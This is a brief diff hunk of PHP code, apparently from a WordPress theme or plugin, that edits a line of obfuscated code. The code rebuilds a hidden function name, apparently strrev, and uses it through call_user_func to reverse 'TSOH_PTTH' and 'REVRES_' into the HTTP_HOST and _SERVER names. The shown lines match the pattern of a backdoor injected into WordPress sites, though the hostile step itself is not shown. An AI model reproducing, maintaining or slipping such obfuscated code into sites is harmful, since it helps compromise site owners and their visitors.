@@ -314,7 +314,7 @@ if (!function_exists('wp_en_one')) {
 
     function wp_en_three()
     {
-        $object_quince = 's...t...r...r...e...v';
+        $object_quince = 's..t..r..r..e..v';
         $object_quince_pim = glues_it($object_quince);
         $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
         $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
